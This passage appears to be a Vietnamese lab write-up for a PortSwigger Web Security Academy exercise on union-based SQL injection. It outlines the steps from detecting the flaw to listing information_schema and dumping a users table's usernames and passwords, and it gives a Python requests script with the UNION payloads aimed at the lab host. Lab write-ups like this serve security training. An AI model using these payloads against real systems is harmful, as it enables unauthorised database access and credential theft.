   - Thử ' -> xác định có lỗi sqli
   - tấn công union based để dò tìm số cột cụ thể của bảng hiện tại
   - dò tìm cột cụ thể có kiểu char
   - dò tìm phiên bản cụ thể của database server
   - dựa vào cấu trúc bảng này, tra cứu tất cả các tên bảng và tên cột nằm trong cấu trúc information_schema của database: 
   
   <img width="1007" height="408" alt="Screenshot 2026-06-24 125238" src="https://github.com/user-attachments/assets/6ccf93ee-cc5d-45f5-813c-e48be24a3674" />

   - Sau khi đã truy ra tên bảng là "users_..." bằng `"Pets' UNION SELECT table_name, NULL FROM information_schema.tables -- "` (chú ý việc dump tên bảng dùng table_name),
   => Truy tìm các tên cột trong bảng đó bằng `"Pets' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_bcejng' -- ",`

   - Sau khi đã có tên các cột, ta dump ra giá trị các cột mình muốn bằng `"Pets' UNION SELECT username_..., password_... FROM users_bcejng -- ",`
   
<details>
   <summary>Solve</summary>
---

```python
# =============================== No CHANGE ====================================

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===================================================================

import requests

cookies = {
    'session': 'devTJnDeQQAFSpffUvLeIivdjBcmnPpa',
}

headers = {
    'Host': '0a8400e904585ad680bb08af00c00051.web-security-academy.net',
    'Sec-Ch-Ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'https://0a8400e904585ad680bb08af00c00051.web-security-academy.net/',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Priority': 'u=0, i',
    # 'Cookie': 'session=devTJnDeQQAFSpffUvLeIivdjBcmnPpa',
}

# Version: PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
params = {
    # 'category': "Pets' UNION SELECT version(), NULL -- "
    # 'category': "Pets' UNION SELECT NULL, NULL FROM users_qgcsyh -- ",
    # 'category': "Pets' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'superuser' -- ",
    # 'category': "Pets' UNION SELECT table_name, NULL FROM information_schema.tables -- ",
    # 'category': "Pets' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_bcejng' -- ",
    # 'category': "Pets' UNION SELECT username_ydxpji, password_uvcxuf FROM users_bcejng -- ",
    
}

response = requests.get(
    'https://0a8400e904585ad680bb08af00c00051.web-security-academy.net/filter',
    params=params,
    cookies=cookies,
    headers=headers,
    verify=False,
)



# ================================================NO CHANGE ======================================



print(response.text)

if ("Internal Server Error" in response.text):
    print("Error: Internal Server Error")
else:
    print("SUCCESS RESPONSE")
```

---
</details>
